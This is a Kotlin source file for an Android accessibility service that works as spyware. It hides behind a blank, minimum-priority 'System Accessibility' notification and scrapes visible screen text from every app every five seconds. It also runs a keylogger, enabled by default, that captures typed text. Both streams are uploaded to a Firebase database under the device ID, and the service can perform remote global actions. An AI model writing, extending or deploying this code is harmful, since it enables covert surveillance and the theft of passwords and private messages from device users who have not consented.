package com.example.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.example.data.sync.LostModeManager
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class RemoteAccessibilityService : AccessibilityService() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var lastScrapedTime = 0L

    private var isKeyloggerActive = staticKeyloggerActive

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        AccessibilityOverlayManager.removeOverlay(this)
        try {
            val channelId = "accessibility_keepalive_channel"
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                val channel = android.app.NotificationChannel(
                    channelId,
                    "System Accessibility",
                    android.app.NotificationManager.IMPORTANCE_MIN
                ).apply {
                    setShowBadge(false)
                    setSound(null, null)
                }
                val notificationManager = getSystemService(android.content.Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
                notificationManager.createNotificationChannel(channel)
            }
            val notification = androidx.core.app.NotificationCompat.Builder(this, channelId)
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setContentTitle("")
                .setContentText("")
                .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .setSilent(true)
                .build()
            startForeground(99921, notification)
        } catch (e: Exception) {
            android.util.Log.e("RemoteAccessibilityService", "Error starting foreground in Accessibility: ${e.message}")
        }

        try {
            val currentInfo = serviceInfo ?: AccessibilityServiceInfo()
            currentInfo.flags = currentInfo.flags or
                    AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            currentInfo.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            currentInfo.eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            currentInfo.notificationTimeout = 50
            serviceInfo = currentInfo
        } catch (e: Exception) {
            android.util.Log.e("RemoteAccessibilityService", "Error in onServiceConnected: ${e.message}")
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        try {
            if (event == null) return
            
            val pkgName = event.packageName?.toString() ?: ""
            
            // 1. Lost Mode Check
            if (LostModeManager.isLostModeActive(this)) {
                val eventType = event.eventType
                if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                    eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
                ) {
                    if (pkgName.isNotEmpty() && pkgName != packageName && !pkgName.contains("inputmethod")) {
                        LostModeManager.launchLostActivity(this)
                    }
                }
                return
            }



            // 3. Realtime Screen Text Scraping
            val eventType = event.eventType
            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            ) {
                val currentTime = System.currentTimeMillis()
                if (currentTime - lastScrapedTime > 5000) { // Throttle every 5 seconds
                    lastScrapedTime = currentTime
                    val rootNode = rootInActiveWindow
                    if (rootNode != null) {
                        val scrapedTextBuilder = StringBuilder()
                        extractTextFromNode(rootNode, scrapedTextBuilder)
                        val scrapedText = scrapedTextBuilder.toString().trim()
                        if (scrapedText.isNotEmpty()) {
                            syncScrapedTextToFirebase(pkgName, scrapedText)
                        }
                        rootNode.recycle()
                    }
                }
            }

            // 4. Keylogger / Keystroke Logging
            if (isKeyloggerActive && event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                val textList = event.text
                if (!textList.isNullOrEmpty()) {
                    val typedText = textList.joinToString(" ")
                    if (typedText.isNotBlank()) {
                        syncKeyloggerToFirebase(pkgName, typedText)
                    }
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("RemoteAccessibilityService", "Exception in onAccessibilityEvent: ${e.message}")
        }
    }

    private fun extractTextFromNode(node: AccessibilityNodeInfo, builder: StringBuilder) {
        try {
            val text = node.text?.toString()
            val contentDesc = node.contentDescription?.toString()
            if (!text.isNullOrBlank()) {
                builder.append(text).append(" ")
            } else if (!contentDesc.isNullOrBlank()) {
                builder.append(contentDesc).append(" ")
            }
            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                if (child != null) {
                    extractTextFromNode(child, builder)
                    child.recycle()
                }
            }
        } catch (_: Exception) {}
    }

    private fun syncScrapedTextToFirebase(pkgName: String, text: String) {
        serviceScope.launch {
            try {
                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "UNKNOWN"
                val ref = FirebaseDatabase.getInstance().getReference("devices").child(deviceId).child("screen_text_scraping")
                val record = mapOf(
                    "package" to pkgName,
                    "scraped_text" to text.take(2000),
                    "timestamp" to System.currentTimeMillis()
                )
                ref.setValue(record)
            } catch (_: Exception) {}
        }
    }

    private fun syncKeyloggerToFirebase(pkgName: String, typedText: String) {
        serviceScope.launch {
            try {
                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "UNKNOWN"
                val ref = FirebaseDatabase.getInstance().getReference("devices").child(deviceId).child("keylogger")
                val record = mapOf(
                    "package" to pkgName,
                    "typed_text" to typedText,
                    "timestamp" to System.currentTimeMillis()
                )
                ref.push().setValue(record)
            } catch (_: Exception) {}
        }
    }

    override fun onInterrupt() {
        android.util.Log.d("RemoteAccessibilityService", "onInterrupt called - keeping service instance alive")
    }

    override fun onDestroy() {
        super.onDestroy()
        if (instance === this) {
            instance = null
        }
        android.util.Log.d("RemoteAccessibilityService", "onDestroy called")
    }

    override fun onUnbind(intent: Intent?): Boolean {
        if (instance === this) {
            instance = null
        }
        return super.onUnbind(intent)
    }

    companion object {
        @Volatile
        var instance: RemoteAccessibilityService? = null
            private set

        var staticKeyloggerActive = true

        fun isServiceEnabled(): Boolean {
            if (instance != null) return true
            val context = com.example.data.sync.RemoteCommandManager.instanceContext ?: return false
            return AccessibilityOverlayManager.isAccessibilityEnabled(context)
        }

        fun performAction(actionId: Int): Boolean {
            val service = instance ?: return false
            if (android.os.Looper.myLooper() == android.os.Looper.getMainLooper()) {
                return try {
                    service.performGlobalAction(actionId)
                } catch (e: Exception) {
                    android.util.Log.e("RemoteAccessibilityService", "Error performing global action $actionId: ${e.message}")
                    false
                }
            } else {
                val latch = java.util.concurrent.CountDownLatch(1)
                var result = false
                android.os.Handler(android.os.Looper.getMainLooper()).post {
                    try {
                        result = service.performGlobalAction(actionId)
                    } catch (e: Exception) {
                        android.util.Log.e("RemoteAccessibilityService", "Error performing global action $actionId on main thread: ${e.message}")
                    } finally {
                        latch.countDown()
                    }
                }
                try {
                    latch.await(2, java.util.concurrent.TimeUnit.SECONDS)
                } catch (_: Exception) {}
                return result
            }
        }

        fun setKeyloggerActive(active: Boolean): Boolean {
            staticKeyloggerActive = active
            instance?.isKeyloggerActive = active
            return true
        }
    }
}
